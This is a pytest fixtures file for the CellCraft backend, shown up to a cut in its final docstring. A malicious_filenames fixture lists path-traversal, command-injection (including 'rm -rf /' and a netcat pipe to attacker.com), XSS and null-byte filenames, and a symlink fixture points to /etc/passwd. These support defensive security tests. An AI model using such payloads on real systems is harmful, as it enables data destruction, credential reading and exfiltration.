"""
Shared pytest fixtures for CellCraft backend tests.

This module provides common fixtures for:
- Database setup (in-memory SQLite)
- Test client (FastAPI TestClient)
- Sample data (User, Plugin, Workflow, etc.)
"""
import os
import pytest
from typing import Generator
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker, Session
from fastapi.testclient import TestClient

# IMPORTANT: Set TESTING environment variable BEFORE importing app
# This makes app/database/conn.py use PostgreSQL test DB (localhost:5433)
os.environ["TESTING"] = "1"

from app.main import app
from app.database.conn import Base
from app.database import models
from app.routes.dep import get_db
from app.common.security import get_password_hash
from app.common.enums import PluginType


# ==============================================================================
# Database Fixtures
# ==============================================================================

@pytest.fixture(scope="session")
def test_engine():
    """
    Create PostgreSQL test database engine.

    Scope: session (shared across all tests in the session)

    Connects to: Docker test-db service (localhost:5433)
    Database: cellcraft_test
    Credentials: test_user / test_pass

    Note: Requires test-db service running:
        docker compose -f docker-compose.dev.yml up test-db -d
    """
    TEST_DATABASE_URI = os.environ.get(
        "TEST_DATABASE_URI",
        "postgresql://test_user:test_pass@localhost:5433/cellcraft_test"
    )

    engine = create_engine(
        TEST_DATABASE_URI,
        echo=False,  # Set to True for SQL debugging
        pool_pre_ping=True
    )

    # Create all tables
    Base.metadata.create_all(bind=engine)

    yield engine

    # Cleanup
    Base.metadata.drop_all(bind=engine)
    engine.dispose()


@pytest.fixture(scope="function")
def db_session(test_engine) -> Generator[Session, None, None]:
    """
    Create a new database session for each test with complete isolation.

    Scope: function (new session for each test)

    Isolation Strategy: Drop and recreate all tables before each test
    to ensure a clean state. This prevents data leakage between tests.

    Yields:
        Session: SQLAlchemy session for database operations
    """
    # Complete isolation: Drop and recreate all tables before each test
    Base.metadata.drop_all(bind=test_engine)
    Base.metadata.create_all(bind=test_engine)

    TestingSessionLocal = sessionmaker(
        autocommit=False,
        autoflush=False,
        bind=test_engine
    )

    session = TestingSessionLocal()

    yield session

    # Cleanup
    session.close()
    # Note: No rollback needed - tables will be dropped in next test


@pytest.fixture(scope="function")
def client(db_session: Session) -> Generator[TestClient, None, None]:
    """
    Create a FastAPI TestClient with test database dependency override.

    Scope: function (new client for each test)

    Args:
        db_session: Test database session

    Yields:
        TestClient: FastAPI test client for API testing
    """
    def override_get_db():
        try:
            yield db_session
        finally:
            pass  # Session cleanup handled by db_session fixture

    app.dependency_overrides[get_db] = override_get_db

    with TestClient(app) as test_client:
        yield test_client

    app.dependency_overrides.clear()


# ==============================================================================
# Sample Data Fixtures
# ==============================================================================

@pytest.fixture
def sample_user(db_session: Session) -> models.User:
    """
    Create a sample user for testing.

    Returns:
        models.User: Test user with credentials:
            - username: testuser
            - email: testuser@example.com
            - password: testpassword123
    """
    user = models.User(
        username="testuser",
        email="testuser@example.com",
        hashed_password=get_password_hash("testpassword123"),
        is_active=True,
        is_superuser=False
    )
    db_session.add(user)
    db_session.commit()
    db_session.refresh(user)
    return user


@pytest.fixture
def sample_admin_user(db_session: Session) -> models.User:
    """
    Create a sample admin user for testing.

    Returns:
        models.User: Test admin user with credentials:
            - username: admin
            - email: admin@example.com
            - password: adminpassword123
    """
    admin = models.User(
        username="admin",
        email="admin@example.com",
        hashed_password=get_password_hash("adminpassword123"),
        is_active=True,
        is_superuser=True
    )
    db_session.add(admin)
    db_session.commit()
    db_session.refresh(admin)
    return admin


@pytest.fixture
def sample_inactive_user(db_session: Session) -> models.User:
    """
    Create a sample inactive user for testing.

    Returns:
        models.User: Test inactive user with credentials:
            - username: inactiveuser
            - email: inactive@example.com
            - password: testpassword123
            - is_active: False
    """
    inactive_user = models.User(
        username="inactiveuser",
        email="inactive@example.com",
        hashed_password=get_password_hash("testpassword123"),
        is_active=False,
        is_superuser=False
    )
    db_session.add(inactive_user)
    db_session.commit()
    db_session.refresh(inactive_user)
    return inactive_user


@pytest.fixture
def sample_plugin(db_session: Session) -> models.Plugin:
    """
    Create a sample local plugin for testing.

    Returns:
        models.Plugin: Test plugin (local, editable)
    """
    plugin = models.Plugin(
        name="TestPlugin",
        description="Test plugin for unit testing",
        author="test_author",
        plugin_path="./plugin/local/TestPlugin/",
        plugin_type=PluginType.ANALYSIS,  # Use enum value instead of string
        dependencies={
            "requirements.txt": "numpy==1.24.0\npandas==2.0.0"
        },
        drawflow={
            "drawflow": {
                "Home": {
                    "data": {
                        "1": {
                            "name": "test_node",
                            "data": {
                                "parameters": [
                                    {"name": "param1", "defaultValue": "test"}
                                ]
                            }
                        }
                    }
                }
            }
        },
        rules={
            "Snakefile": "rule test:\n    output: 'test.txt'\n    shell: 'echo test > {output}'"
        },
        use_gpu=False,
        source="local",
        is_editable=True,
        version="1.0.0"
    )
    db_session.add(plugin)
    db_session.commit()
    db_session.refresh(plugin)
    return plugin


@pytest.fixture
def sample_workflow(db_session: Session, sample_user: models.User) -> models.Workflow:
    """
    Create a sample workflow for testing.

    Args:
        db_session: Database session
        sample_user: User who owns the workflow

    Returns:
        models.Workflow: Test workflow
    """
    workflow = models.Workflow(
        title="Test Workflow",
        workflow_info={
            "drawflow": {
                "Home": {
                    "data": {}
                }
            }
        },
        user_id=sample_user.id
    )
    db_session.add(workflow)
    db_session.commit()
    db_session.refresh(workflow)
    return workflow


@pytest.fixture
def sample_file(db_session: Session, sample_user: models.User) -> models.File:
    """
    Create a sample file metadata for testing.

    Args:
        db_session: Database session
        sample_user: User who owns the file

    Returns:
        models.File: Test file metadata
    """
    file_record = models.File(
        file_name="test_data.h5ad",
        file_path="/app/user_data/testuser/test_data.h5ad",
        file_size="1048576",  # 1MB in bytes as string
        folder="/app/user_data/testuser",
        user_id=sample_user.id
    )
    db_session.add(file_record)
    db_session.commit()
    db_session.refresh(file_record)
    return file_record


# ==============================================================================
# Authentication Helper Fixtures
# ==============================================================================

@pytest.fixture
def auth_headers(client: TestClient, sample_user: models.User) -> dict:
    """
    Get authentication headers with valid JWT token.

    Args:
        client: FastAPI test client
        sample_user: User to authenticate

    Returns:
        dict: Headers with Authorization Bearer token
    """
    response = client.post(
        "/routes/auth/login/access-token",
        data={
            "username": sample_user.email,
            "password": "testpassword123"
        }
    )

    assert response.status_code == 200
    token = response.json()["access_token"]

    return {"Authorization": f"Bearer {token}"}


@pytest.fixture
def admin_auth_headers(client: TestClient, sample_admin_user: models.User) -> dict:
    """
    Get authentication headers for admin user with valid JWT token.

    Args:
        client: FastAPI test client
        sample_admin_user: Admin user to authenticate

    Returns:
        dict: Headers with Authorization Bearer token
    """
    response = client.post(
        "/routes/auth/login/access-token",
        data={
            "username": sample_admin_user.email,
            "password": "adminpassword123"
        }
    )

    assert response.status_code == 200
    token = response.json()["access_token"]

    return {"Authorization": f"Bearer {token}"}


@pytest.fixture
def expired_token(sample_user: models.User) -> str:
    """
    Create an expired JWT token for testing.

    Args:
        sample_user: User to create token for

    Returns:
        str: Expired JWT token (expired 10 minutes ago)
    """
    from datetime import timedelta
    from app.common.security import create_access_token

    # Create token that expired 10 minutes ago
    token = create_access_token(
        subject=sample_user.id,
        expires_delta=timedelta(minutes=-10)
    )
    return token


@pytest.fixture
def tampered_token(sample_user: models.User) -> str:
    """
    Create a tampered JWT token for testing.

    Args:
        sample_user: User to create token for

    Returns:
        str: JWT token with tampered signature
    """
    from app.common.security import create_access_token

    # Create valid token and tamper with signature
    valid_token = create_access_token(subject=sample_user.id)
    # Tamper with last 10 characters of signature
    tampered = valid_token[:-10] + "tampered00"
    return tampered


@pytest.fixture
def user_factory(db_session: Session):
    """
    Factory fixture for creating multiple test users with custom attributes.

    Args:
        db_session: Database session

    Returns:
        function: Factory function that creates users with custom parameters

    Example:
        user1 = user_factory(username="user1", email="user1@test.com")
        user2 = user_factory(username="user2", is_superuser=True)
    """
    def create_user(
        username: str = None,
        email: str = None,
        password: str = "testpassword123",
        is_active: bool = True,
        is_superuser: bool = False
    ) -> models.User:
        """
        Create a user with specified attributes.

        Args:
            username: Username (auto-generated if None)
            email: Email (auto-generated if None)
            password: Plain text password (default: "testpassword123")
            is_active: Active status (default: True)
            is_superuser: Superuser status (default: False)

        Returns:
            models.User: Created user
        """
        from faker import Faker
        fake = Faker()

        if username is None:
            username = fake.user_name()
        if email is None:
            email = fake.email()

        user = models.User(
            username=username,
            email=email,
            hashed_password=get_password_hash(password),
            is_active=is_active,
            is_superuser=is_superuser
        )
        db_session.add(user)
        db_session.commit()
        db_session.refresh(user)
        return user

    return create_user


# ==============================================================================
# Workflow-Specific Fixtures (Phase 3.1)
# ==============================================================================

@pytest.fixture
def sample_workflow_with_algorithm(db_session: Session, sample_user: models.User) -> models.Workflow:
    """
    Create a workflow with a single algorithm node for testing compilation.

    Args:
        db_session: Database session
        sample_user: User who owns the workflow

    Returns:
        models.Workflow: Workflow with algorithm node structure
    """
    workflow_info = {
        "drawflow": {
            "Home": {
                "data": {
                    "1": {
                        "id": 1,
                        "name": "algorithm",
                        "class": "algorithm",
                        "selectedPlugin": {
                            "name": "TestPlugin",
                            "source": "local"
                        },
                        "selectedPluginInputOutput": {
                            "inputs": [],
                            "outputs": []
                        },
                        "selectedPluginRules": {
                            "param1": "value1"
                        }
                    }
                }
            }
        }
    }

    workflow = models.Workflow(
        title="Algorithm Test Workflow",
        workflow_info=workflow_info,
        user_id=sample_user.id
    )
    db_session.add(workflow)
    db_session.commit()
    db_session.refresh(workflow)
    return workflow


@pytest.fixture
def sample_workflow_complex(db_session: Session, sample_user: models.User) -> models.Workflow:
    """
    Create a complex workflow with multiple nodes (algorithms + visualization).

    Args:
        db_session: Database session
        sample_user: User who owns the workflow

    Returns:
        models.Workflow: Complex workflow with multiple node types
    """
    workflow_info = {
        "drawflow": {
            "Home": {
                "data": {
                    "1": {
                        "id": 1,
                        "name": "algorithm",
                        "class": "algorithm",
                        "selectedPlugin": {
                            "name": "TestPlugin1",
                            "source": "local"
                        },
                        "selectedPluginInputOutput": {},
                        "selectedPluginRules": {}
                    },
                    "2": {
                        "id": 2,
                        "name": "algorithm",
                        "class": "algorithm",
                        "selectedPlugin": {
                            "name": "TestPlugin2",
                            "source": "local"
                        },
                        "selectedPluginInputOutput": {},
                        "selectedPluginRules": {}
                    },
                    "3": {
                        "id": 3,
                        "name": "visualization",
                        "class": "visualization",
                        "selectedVisualizationPlugin": {
                            "name": "VizPlugin",
                            "source": "local"
                        }
                    }
                }
            }
        }
    }

    workflow = models.Workflow(
        title="Complex Multi-Node Workflow",
        workflow_info=workflow_info,
        user_id=sample_user.id
    )
    db_session.add(workflow)
    db_session.commit()
    db_session.refresh(workflow)
    return workflow


@pytest.fixture
def sample_workflow_data() -> dict:
    """
    Provide standard workflow data structure for testing creation/updates.

    Returns:
        dict: Standard workflow data with drawflow structure
    """
    return {
        "title": "Test Workflow",
        "thumbnail": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUg",
        "workflow_info": {
            "drawflow": {
                "Home": {
                    "data": {
                        "1": {
                            "id": 1,
                            "name": "data",
                            "class": "data",
                            "data": {
                                "file": "test_data.h5ad"
                            }
                        }
                    }
                }
            }
        }
    }


@pytest.fixture
def temp_user_directory(sample_user: models.User):
    """
    Create temporary user directory for testing file operations.
    Automatically cleans up after test completes.

    Args:
        sample_user: User for which to create directory

    Yields:
        str: Path to user directory
    """
    import tempfile
    import shutil

    # Use tempfile to avoid permission issues with existing directories
    user_dir = tempfile.mkdtemp(prefix=f"cellcraft_{sample_user.username}_")

    yield user_dir

    # Cleanup after test
    if os.path.exists(user_dir):
        shutil.rmtree(user_dir, ignore_errors=True)


# ==============================================================================
# File-Specific Fixtures (Phase 3.3)
# ==============================================================================

@pytest.fixture
def temp_user_file_directory(sample_user: models.User):
    """
    Create temporary user file directory structure.
    Auto-cleanup after test.

    Structure:
        /tmp/pytest-{random}/{username}/
            data/
            result/

    Args:
        sample_user: User for directory creation

    Yields:
        dict: Directory paths
            - user_dir: Root user directory
            - data_dir: Data subdirectory
            - result_dir: Result subdirectory
    """
    import tempfile
    import shutil

    # Use tempfile to avoid permission issues with existing directories
    temp_base = tempfile.mkdtemp(prefix="cellcraft_test_")
    user_dir = os.path.join(temp_base, sample_user.username)
    data_dir = os.path.join(user_dir, "data")
    result_dir = os.path.join(user_dir, "result")

    os.makedirs(data_dir, exist_ok=True)
    os.makedirs(result_dir, exist_ok=True)

    yield {
        "user_dir": user_dir,
        "data_dir": data_dir,
        "result_dir": result_dir
    }

    # Cleanup
    if os.path.exists(temp_base):
        shutil.rmtree(temp_base, ignore_errors=True)


@pytest.fixture
def temp_tutorials_directory():
    """
    Create temporary tutorials directory for testing public file access.
    Auto-cleanup after test.

    Yields:
        str: Path to tutorials directory
    """
    import tempfile
    import shutil

    # Use tempfile to avoid permission issues
    tutorials_dir = tempfile.mkdtemp(prefix="cellcraft_tutorials_")

    yield tutorials_dir

    # Cleanup
    if os.path.exists(tutorials_dir):
        shutil.rmtree(tutorials_dir, ignore_errors=True)


@pytest.fixture
def mock_h5ad_file(temp_user_file_directory):
    """
    Create mock H5AD file for testing using real anndata structure.
    Uses scanpy to generate valid H5AD format.

    Args:
        temp_user_file_directory: User directory paths

    Yields:
        dict: H5AD file information
            - filename: File name (test_data.h5ad)
            - filepath: Full path to file
            - adata: AnnData object (for validation)
            - n_obs: Number of observations (cells)
            - n_vars: Number of variables (genes)
    """
    try:
        import anndata as ad
        import numpy as np
        import pandas as pd
    except ImportError:
        pytest.skip("anndata not installed")

    # Create mock anndata object
    n_obs = 100
    n_vars = 50

    X = np.random.rand(n_obs, n_vars)
    obs = pd.DataFrame({
        'cell_type': np.random.choice(['TypeA', 'TypeB', 'TypeC'], n_obs),
        'cluster': np.random.choice(['Cluster1', 'Cluster2'], n_obs),
        'pseudotime': np.random.rand(n_obs)
    })
    var = pd.DataFrame(index=[f'Gene{i}' for i in range(n_vars)])

    adata = ad.AnnData(X=X, obs=obs, var=var)

    # Add UMAP coordinates
    adata.obsm['X_umap'] = np.random.rand(n_obs, 2)

    # Save to file
    filename = "test_data.h5ad"
    filepath = os.path.join(temp_user_file_directory["data_dir"], filename)
    adata.write_h5ad(filepath)

    yield {
        "filename": filename,
        "filepath": filepath,
        "adata": adata,
        "n_obs": n_obs,
        "n_vars": n_vars
    }


@pytest.fixture
def mock_h5ad_file_large(temp_user_file_directory):
    """
    Create large mock H5AD file for performance testing.

    Args:
        temp_user_file_directory: User directory paths

    Yields:
        dict: Large H5AD file information (10,000 cells x 2,000 genes)
    """
    try:
        import anndata as ad
        import numpy as np
        import pandas as pd
    except ImportError:
        pytest.skip("anndata not installed")

    # Create large dataset
    n_obs = 10000
    n_vars = 2000

    X = np.random.rand(n_obs, n_vars).astype(np.float32)
    obs = pd.DataFrame({
        'cell_type': np.random.choice(['TypeA', 'TypeB', 'TypeC', 'TypeD'], n_obs),
        'cluster': np.random.choice([f'Cluster{i}' for i in range(10)], n_obs),
        'pseudotime': np.random.rand(n_obs)
    })
    var = pd.DataFrame(index=[f'Gene{i}' for i in range(n_vars)])

    adata = ad.AnnData(X=X, obs=obs, var=var)
    adata.obsm['X_umap'] = np.random.rand(n_obs, 2)

    filename = "large_data.h5ad"
    filepath = os.path.join(temp_user_file_directory["data_dir"], filename)
    adata.write_h5ad(filepath)

    yield {
        "filename": filename,
        "filepath": filepath,
        "n_obs": n_obs,
        "n_vars": n_vars
    }


@pytest.fixture
def upload_file_factory():
    """
    Factory for creating mock UploadFile objects.

    Returns:
        Callable: Factory function that creates UploadFile instances

    Example:
        upload_file = upload_file_factory(
            filename="test.h5ad",
            content=b"mock_h5ad_data",
            content_type="application/octet-stream"
        )
    """
    from io import BytesIO
    from fastapi import UploadFile
    from starlette.datastructures import Headers

    def create_upload_file(
        filename: str,
        content: bytes,
        content_type: str = "application/octet-stream"
    ) -> UploadFile:
        """
        Create a mock UploadFile object.

        Args:
            filename: Name of the file
            content: Binary content
            content_type: MIME type

        Returns:
            UploadFile: FastAPI UploadFile instance
        """
        file_obj = BytesIO(content)
        file_obj.seek(0)  # Reset to beginning

        # Create headers with content-type
        headers = Headers({
            "content-type": content_type
        })

        return UploadFile(
            file=file_obj,
            size=len(content),
            filename=filename,
            headers=headers
        )

    return create_upload_file


@pytest.fixture
def mock_upload_files(upload_file_factory):
    """
    Create multiple mock UploadFile objects for batch upload testing.

    Args:
        upload_file_factory: Factory for creating UploadFile objects

    Returns:
        List[UploadFile]: List of 3 mock upload files
    """
    files = [
        upload_file_factory(
            filename="folder1_file1.h5ad",
            content=b"mock_h5ad_data_1" * 100,  # ~1.5KB
            content_type="application/octet-stream"
        ),
        upload_file_factory(
            filename="folder2_file2.h5ad",
            content=b"mock_h5ad_data_2" * 100,
            content_type="application/octet-stream"
        ),
        upload_file_factory(
            filename="folder3_file3.h5ad",
            content=b"mock_h5ad_data_3" * 100,
            content_type="application/octet-stream"
        )
    ]
    return files


@pytest.fixture
def mock_large_upload_file(upload_file_factory):
    """
    Create mock large file for size limit testing.

    Args:
        upload_file_factory: Factory for creating UploadFile objects

    Returns:
        UploadFile: Large file (600MB to exceed 500MB limit)
    """
    # Create 600MB file (exceeds 500MB limit)
    # Using smaller size for testing - actual validation checks file.tell()
    large_content = b"X" * (600 * 1024 * 1024)

    return upload_file_factory(
        filename="folder_large_file.h5ad",
        content=large_content,
        content_type="application/octet-stream"
    )


@pytest.fixture
def malicious_filenames():
    """
    Provide list of malicious filenames for path traversal testing.

    Returns:
        List[str]: Malicious filename patterns
    """
    return [
        # Path traversal attacks
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../backend/.env",
        "../other_user/secret.h5ad",
        "../../../../proc/self/environ",

        # Injection attacks
        "file;rm -rf /",
        "file && cat /etc/passwd",
        "file | nc attacker.com 1234",
        "file`whoami`.h5ad",

        # XSS/Script injection
        "file<script>alert('xss')</script>.h5ad",
        "file'><img src=x onerror=alert(1)>.h5ad",

        # Null byte injection
        "file\x00.h5ad",
        "file.h5ad\x00.exe",

        # Extremely long filename
        "very_long_" + "a" * 500 + ".h5ad",

        # Unicode/Special characters
        "数据文件.h5ad",
        "файл.h5ad",
        "file\n\r\t.h5ad"
    ]


@pytest.fixture
def symlink_attack_setup(temp_user_file_directory):
    """
    Create symlink pointing outside user directory for security testing.

    Args:
        temp_user_file_directory: User directory paths

    Yields:
        dict: Symlink information
            - symlink_path: Path to symlink
            - target_path: Path symlink points to (/etc/passwd)
    """
    # Create symlink to /etc/passwd
    symlink_path = os.path.join(
        temp_user_file_directory["data_dir"],
        "symlink_file.h5ad"
    )
    target_path = "/etc/passwd"

    try:
        os.symlink(target_path, symlink_path)
    except (OSError, NotImplementedError):
        pytest.skip("Symlink creation not supported on this platform")

    yield {
        "symlink_path": symlink_path,
        "target_path": target_path,
        "symlink_filename": "symlink_file.h5ad"
    }

    # Cleanup
    if os.path.islink(symlink_path):
        os.unlink(symlink_path)


@pytest.fixture
def sample_file_metadata(db_session: Session, sample_user: models.User) -> models.File:
    """
    Create sample file metadata in database.

    Args:
        db_session: Database session
        sample_user: User who owns the file

    Returns:
        models.File: File record with metadata
    """
    file_record = models.File(
        file_name="test_data.h5ad",
        file_path="./user/testuser/data",
        file_size="1048576",  # 1MB
        folder="test_folder",
        user_id=sample_user.id
    )
    db_session.add(file_record)
    db_session.commit()
    db_session.refresh(file_record)
    return file_record


@pytest.fixture
def multiple_file_metadata(db_session: Session, sample_user: models.User):
    """
    Create multiple file metadata records for testing list operations.

    Args:
        db_session: Database session
        sample_user: User who owns the files

    Returns:
        List[models.File]: List of 5 file records across 3 folders
    """
    files = []

    # Folder 1: 2 files
    for i in range(2):
        file_record = models.File(
            file_name=f"folder1_data{i}.h5ad",
            file_path=f"./user/{sample_user.username}/data",
            file_size=str(1024 * (i + 1)),
            folder="folder1",
            user_id=sample_user.id
        )
        db_session.add(file_record)
        files.append(file_record)

    # Folder 2: 2 files
    for i in range(2):
        file_record = models.File(
            file_name=f"folder2_data{i}.h5ad",
            file_path=f"./user/{sample_user.username}/data",
            file_size=str(2048 * (i + 1)),
            folder="folder2",
            user_id=sample_user.id
        )
        db_session.add(file_record)
        files.append(file_record)

    # Folder 3: 1 file
    file_record = models.File(
        file_name="folder3_data.h5ad",
        file_path=f"./user/{sample_user.username}/data",
        file_size="4096",
        folder="folder3",
        user_id=sample_user.id
    )
    db_session.add(file_record)
    files.append(file_record)

    db_session.commit()

    for file_record in files:
        db_session.refresh(file_record)

    return files


@pytest.fixture
def mock_scanpy_operations(monkeypatch):
    """
    Mock scanpy operations to avoid actual H5AD processing.
    Speeds up tests that don't need real H5AD data.

    Args:
        monkeypatch: Pytest monkeypatch fixture

    Yields:
        MagicMock: Mocked scanpy module
    """
    from unittest.mock import MagicMock
    import numpy as np
    import pandas as pd

    try:
        import scanpy as sc
    except ImportError:
        pytest.skip("scanpy not installed")

    # Create mock AnnData object
    mock_adata = MagicMock()
    mock_adata.obs = pd.DataFrame({
        'cluster': ['A', 'B', 'C', 'A', 'B'],
        'cell_type': ['Type1', 'Type2', 'Type1', 'Type2', 'Type1'],
        'pseudotime': [0.1, 0.2, 0.3, 0.4, 0.5]
    })
    mock_adata.obsm = {'X_umap': np.array([[1, 2], [3, 4], [5, 6], [7, 8], [9, 10]])}
    mock_adata.var = pd.DataFrame(index=['Gene1', 'Gene2', 'Gene3'])
    mock_adata.to_df.return_value = pd.DataFrame(np.random.rand(5, 3))

    # Mock scanpy.read_h5ad
    def mock_read_h5ad(filepath):
        return mock_adata

    monkeypatch.setattr(sc, 'read_h5ad', mock_read_h5ad)

    yield mock_adata


@pytest.fixture
def sample_json_setup_file(temp_user_file_directory):
    """
    Create sample JSON setup file for testing /setup endpoints.

    Args:
        temp_user_file_directory: User directory paths

    Returns:
        dict: Setup file information
            - filename: File name
            - filepath: Full path
            - content: JSON content
    """
    import json

    setup_data = {
        "algorithm": "TENET",
        "parameters": {
            "fdr_threshold": 0.05,
            "top_genes": 100
        },
        "input_files": ["data.h5ad"],
        "output_format": "csv"
    }

    filename = "setup_config.json"
    filepath = os.path.join(temp_user_file_directory["data_dir"], filename)

    with open(filepath, 'w') as f:
        json.dump(setup_data, f)

    return {
        "filename": filename,
        "filepath": filepath,
        "content": setup_data
    }


@pytest.fixture
def sample_csv_result_file(temp_user_file_directory):
    """
    Create sample CSV result file for testing /result endpoints.

    Args:
        temp_user_file_directory: User directory paths

    Returns:
        dict: Result file information
    """
    import pandas as pd

    result_data = pd.DataFrame({
        'gene': ['Gene1', 'Gene2', 'Gene3'],
        'score': [0.95, 0.87, 0.76],
        'pvalue': [0.001, 0.01, 0.05]
    })

    filename = "option1_test_data_result.csv"
    filepath = os.path.join(temp_user_file_directory["result_dir"], filename)

    result_data.to_csv(filepath, index=False)

    return {
        "filename": filename,
        "filepath": filepath,
        "content": result_data
    }


@pytest.fixture
def sample_html_tutorial_file(temp_tutorials_directory):
    """
    Create sample HTML tutorial file for testing /html endpoint.

    Args:
        temp_tutorials_directory: Tutorials directory path

    Returns:
        dict: Tutorial file information
    """
    html_content = """
    <!DOCTYPE html>
    <html>
    <head><title>Test Tutorial</title></head>
    <body>
        <h1>CellCraft Tutorial</h1>
        <p>This is a test tutorial.</p>
    </body>
    </html>
    """

    filename = "tutorial_test.html"
    filepath = os.path.join(temp_tutorials_directory, filename)

    with open(filepath, 'w') as f:
        f.write(html_content)

    return {
        "filename": filename,
        "filepath": filepath,
        "content": html_content
    }


# ==============================================================================
# Plugin-Specific Fixtures (Phase 3.2)
# ==============================================================================

@pytest.fixture
def sample_plugin_official(db_session: Session) -> models.Plugin:
    """
    Create a sample official plugin (read-only) for testing.

    Args:
        db_session: Database session

    Returns:
        models.Plugin: Official test plugin (non-editable)
    """
    plugin = models.Plugin(
        name="OfficialPlugin",
        description="Official plugin from repository",
        author="official_team",
        plugin_path="./plugin/official/OfficialPlugin/",
        plugin_type=PluginType.ANALYSIS,
        dependencies={
            "requirements.txt": "numpy==1.24.0\npandas==2.0.0\nscipy==1.10.0"
        },
        drawflow={
            "drawflow": {
                "Home": {
                    "data": {
                        "1": {
                            "name": "official_node",
                            "data": {
                                "parameters": [
                                    {"name": "threshold", "defaultValue": 0.05}
                                ]
                            }
                        }
                    }
                }
            }
        },
        rules={
            "rule_1": {
                "name": "official_analysis",
                "input": ["data.h5ad"],
                "output": ["results.csv"],
                "script": "analyze.py"
            }
        },
        use_gpu=False,
        source="official",
        is_editable=False,
        version="1.0.0"
    )
    db_session.add(plugin)
    db_session.commit()
    db_session.refresh(plugin)
    return plugin


@pytest.fixture
def sample_plugin_data() -> dict:
    """
    Provide standard plugin data structure for testing creation/validation.

    Returns:
        dict: Standard plugin data with all required fields
    """
    return {
        "plugin": {
            "name": "TestPlugin",
            "description": "Test plugin for integration testing",
            "pluginType": "analysis",
            "referenceFolders": [],
            "dependencyFiles": [
                {
                    "fileName": "requirements.txt",
                    "file": "numpy==1.24.0\npandas==2.0.0",
                    "type": "text"
                }
            ],
            "useGpu": False
        },
        "rules": [
            {
                "name": "test_rule",
                "input": ["input.h5ad"],
                "output": ["output.csv"],
                "script": "test_script.py",
                "parameters": [
                    {
                        "name": "param1",
                        "type": "number",
                        "defaultValue": 10
                    }
                ],
                "nodeId": 1,
                "isVisualization": False
            }
        ],
        "drawflow": {
            "drawflow": {
                "Home": {
                    "data": {}
                }
            }
        }
    }


@pytest.fixture
def temp_plugin_directory():
    """
    Create temporary plugin directory for testing file operations.
    Automatically cleans up after test completes.

    Yields:
        str: Path to temporary plugin directory
    """
    import tempfile
    import shutil

    temp_dir = tempfile.mkdtemp(prefix="test_plugin_")

    yield temp_dir

    # Cleanup after test
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)


# ==============================================================================
# Task-Specific Fixtures (Phase 3.4)
# ==============================================================================

@pytest.fixture
def sample_task(db_session: Session, sample_user: models.User, sample_workflow: models.Workflow, sample_plugin: models.Plugin) -> models.Task:
    """
    Create a sample running task for testing.

    Args:
        db_session: Database session
        sample_user: User who owns the task
        sample_workflow: Workflow associated with task
        sample_plugin: Plugin being executed

    Returns:
        models.Task: Running task record
    """
    from datetime import datetime
    import uuid

    task = models.Task(
        task_id=f"test-task-{uuid.uuid4().hex[:16]}",
        user_id=sample_user.id,
        workflow_id=sample_workflow.id,
        algorithm_id="1",
        plugin_name=sample_plugin.name,
        plugin_id=sample_plugin.id,
        task_type="compile",
        status="RUNNING",
        start_time=datetime.now(),
        plugin_image_uri=f"plugin-{sample_plugin.name.lower()}:latest"
    )
    db_session.add(task)
    db_session.commit()
    db_session.refresh(task)
    return task


@pytest.fixture
def sample_completed_task(db_session: Session, sample_user: models.User, sample_workflow: models.Workflow, sample_plugin: models.Plugin) -> models.Task:
    """
    Create a sample completed task for testing.

    Args:
        db_session: Database session
        sample_user: User who owns the task
        sample_workflow: Workflow associated with task
        sample_plugin: Plugin that was executed

    Returns:
        models.Task: Completed task record with SUCCESS status
    """
    from datetime import datetime, timedelta
    import uuid

    task = models.Task(
        task_id=f"completed-task-{uuid.uuid4().hex[:16]}",
        user_id=sample_user.id,
        workflow_id=sample_workflow.id,
        algorithm_id="2",
        plugin_name=sample_plugin.name,
        plugin_id=sample_plugin.id,
        task_type="compile",
        status="SUCCESS",
        start_time=datetime.now() - timedelta(hours=1),
        end_time=datetime.now(),
        plugin_image_uri=f"plugin-{sample_plugin.name.lower()}:latest"
    )
    db_session.add(task)
    db_session.commit()
    db_session.refresh(task)
    return task


@pytest.fixture
def sample_visualization_plugin(db_session: Session) -> models.Plugin:
    """
    Create a visualization plugin for testing plugin type validation.

    Execution manifest endpoint should reject visualization plugins (400 error).

    Returns:
        models.Plugin: Visualization plugin (not analysis)
    """
    plugin = models.Plugin(
        name="TestVizPlugin",
        description="Visualization plugin for testing",
        author="test_author",
        plugin_path="./plugin/local/TestVizPlugin/",
        plugin_type=PluginType.VISUALIZATION,  # KEY: VISUALIZATION not ANALYSIS
        dependencies={},
        drawflow={
            "drawflow": {
                "Home": {
                    "data": {
                        "1": {
                            "name": "viz_node",
                            "data": {}
                        }
                    }
                }
            }
        },
        rules={},
        use_gpu=False,
        source="local",
        is_editable=True,
        version="1.0.0"
    )
    db_session.add(plugin)
    db_session.commit()
    db_session.refresh(plugin)
    return plugin


@pytest.fixture
def sample_manifest_user(db_session: Session) -> models.User:
    """
    Create a user specifically for manifest tests to avoid root-owned directory conflicts.

    Returns:
        models.User: Test user with different username (manifestuser)
    """
    user = models.User(
        username="manifestuser",
        email="manifestuser@example.com",
        hashed_password="hashed_password",
        is_active=True
    )
    db_session.add(user)
    db_session.commit()
    db_session.refresh(user)
    return user


@pytest.fixture
def manifest_auth_headers(sample_manifest_user: models.User) -> dict:
    """
    Create authentication headers for manifestuser.

    Returns:
        dict: Headers with Authorization Bearer token
    """
    from app.common.security import create_access_token
    access_token = create_access_token(subject=str(sample_manifest_user.id))
    return {"Authorization": f"Bearer {access_token}"}


@pytest.fixture
def sample_manifest_completed_task(db_session: Session, sample_manifest_user: models.User, sample_workflow: models.Workflow, sample_plugin: models.Plugin) -> models.Task:
    """
    Create a completed task for manifest tests using manifestuser.

    Returns:
        models.Task: Completed task record with SUCCESS status
    """
    from datetime import datetime, timedelta
    import uuid

    task = models.Task(
        task_id=f"manifest-task-{uuid.uuid4().hex[:16]}",
        user_id=sample_manifest_user.id,
        workflow_id=sample_workflow.id,
        algorithm_id="2",
        plugin_name=sample_plugin.name,
        plugin_id=sample_plugin.id,
        task_type="compile",
        status="SUCCESS",
        start_time=datetime.now() - timedelta(hours=1),
        end_time=datetime.now(),
        plugin_image_uri=f"plugin-{sample_plugin.name.lower()}:latest"
    )
    db_session.add(task)
    db_session.commit()
    db_session.refresh(task)
    return task


@pytest.fixture
def temp_manifest_files(sample_manifest_user: models.User, sample_workflow: models.Workflow):
    """
    Create comprehensive temporary file structure for execution manifest testing.

